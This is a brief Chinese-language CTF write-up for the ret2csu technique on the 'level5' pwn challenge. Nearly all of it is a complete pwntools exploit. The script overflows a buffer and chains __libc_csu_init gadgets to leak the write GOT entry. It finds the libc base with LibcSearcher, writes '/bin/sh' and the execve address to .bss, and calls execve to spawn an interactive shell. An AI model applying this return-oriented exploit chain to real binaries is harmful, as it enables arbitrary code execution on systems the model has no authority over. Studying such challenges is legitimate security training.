ret2csu

pwn

当没有合适 gadgets 可用的时候，可以找一找 __libc_csu_init 中的gadgets

具体分析过程见ctf wiki

exp

from pwn import *

from LibcSearcher import *

p = process('./level5')
elf = ELF('./level5')

main = 0x400564
read_got = elf.got['read']
write_got = elf.got['write']
bss = elf.bss()
csu_front_addr = 0x4005f0
csu_end_addr   = 0x400606

'''
0x00000000004005f0 <+80>:    mov    rdx,r15
0x00000000004005f3 <+83>:    mov    rsi,r14
0x00000000004005f6 <+86>:    mov    edi,r13d
0x00000000004005f9 <+89>:    call   QWORD PTR [r12+rbx*8]
0x00000000004005fd <+93>:    add    rbx,0x1
0x0000000000400601 <+97>:    cmp    rbx,rbp
0x0000000000400604 <+100>:    jne    0x4005f0 <__libc_csu_init+80>
0x0000000000400606 <+102>:    mov    rbx,QWORD PTR [rsp+0x8]
0x000000000040060b <+107>:    mov    rbp,QWORD PTR [rsp+0x10]
0x0000000000400610 <+112>:    mov    r12,QWORD PTR [rsp+0x18]
0x0000000000400615 <+117>:    mov    r13,QWORD PTR [rsp+0x20]
0x000000000040061a <+122>:    mov    r14,QWORD PTR [rsp+0x28]
0x000000000040061f <+127>:    mov    r15,QWORD PTR [rsp+0x30]
0x0000000000400624 <+132>:    add    rsp,0x38
0x0000000000400628 <+136>:    ret   
'''

def csu(rbx,rbp,r12,r13,r14,r15,last):
    payload = 'a'*0x88
    payload+= p64(csu_end_addr)+'a'*0x8+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
    payload+= p64(csu_front_addr)+'a'*0x38+p64(last)
    return payload

p.recvuntil('Hello, World\n')
p.sendline(csu(0,1,write_got,1,write_got,8,main))
data = u64(p.recv(6)+'\x00\x00')
libc = LibcSearcher('write',data)
libc_base = data-libc.dump('write')
p.info('libc_base: '+hex(libc_base))

execve = libc_base + libc.dump('execve')
system = libc_base + libc.dump('system')
#p.recvuntil('Hello, World\n')
p.sendline(csu(0,1,read_got,0,bss,0x100,main))
l = '/bin/sh\x00'+p64(execve)
p.sendline(l)

#p.recvuntil('Hello, World\n')
p.sendline(csu(0,1,bss+8,bss,0,0,main))

p.interactive()
